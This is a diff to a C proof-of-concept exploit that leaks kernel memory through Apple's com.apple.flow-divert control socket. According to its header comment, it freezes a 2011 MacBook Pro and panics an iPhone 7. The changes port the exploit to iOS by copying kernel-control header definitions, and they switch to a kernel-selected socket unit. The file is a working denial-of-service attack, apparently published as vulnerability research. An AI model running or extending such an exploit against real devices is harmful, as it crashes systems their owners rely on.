@@ -14,7 +14,7 @@
  *
  * This proof-of-concept exploit crashes the system by repeatedly allocating and leaking memory
  * from the kalloc.1024 zone. It takes about ten seconds to freeze my 2011 Macbook Pro running
- * macOS High Sierra 17A362a.
+ * macOS High Sierra 17A362a, and just one second to panic my iPhone 7 running iOS 10.1.1.
  *
  * Opening the control socket to com.apple.flow-divert requires root privileges.
  */
@@ -23,12 +23,48 @@
 #include <net/if.h>
 #include <stdio.h>
 #include <string.h>
-#include <sys/sys_domain.h>
-#include <sys/kern_control.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
 
+
+#if __x86_64__
+
+#include <sys/sys_domain.h>
+#include <sys/kern_control.h>
+
+#else /* __x86_64__ */
+
+// If we're not on x86_64, then we probably don't have access to the above headers. The following
+// definitions are copied directly from the macOS header files.
+
+#define SYSPROTO_CONTROL	2	/* kernel control protocol */
+
+#define AF_SYS_CONTROL		2	/* corresponding sub address type */
+
+#define CTLIOCGINFO     _IOWR('N', 3, struct ctl_info)	/* get id from name */
+
+#define MAX_KCTL_NAME	96
+
+struct ctl_info {
+    u_int32_t	ctl_id;					/* Kernel Controller ID  */
+    char	ctl_name[MAX_KCTL_NAME];		/* Kernel Controller Name (a C string) */
+};
+
+struct sockaddr_ctl {
+    u_char	sc_len;		/* depends on size of bundle ID string */
+    u_char	sc_family;	/* AF_SYSTEM */
+    u_int16_t 	ss_sysaddr;	/* AF_SYS_KERNCONTROL */
+    u_int32_t	sc_id; 		/* Controller unique identifier  */
+    u_int32_t 	sc_unit;	/* Developer private unit number */
+    u_int32_t 	sc_reserved[5];
+};
+
+#endif /* __x86_64__ */
+
+
+// The following definition is copied from XNU.
 #define FLOW_DIVERT_MAX_KEY_SIZE 1024
+
 
 int main() {
 	// Open the control socket for com.apple.flow-divert. Requires root.
@@ -49,7 +85,7 @@ int main() {
 		.sc_family  = AF_SYSTEM,
 		.ss_sysaddr = AF_SYS_CONTROL,
 		.sc_id      = ctlinfo.ctl_id, // com.apple.flow-divert
-		.sc_unit    = 1,              // g_flow_divert_groups[1]
+		.sc_unit    = 0,              // Let the kernel select a free unit.
 	};
 	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
 	if (err) {
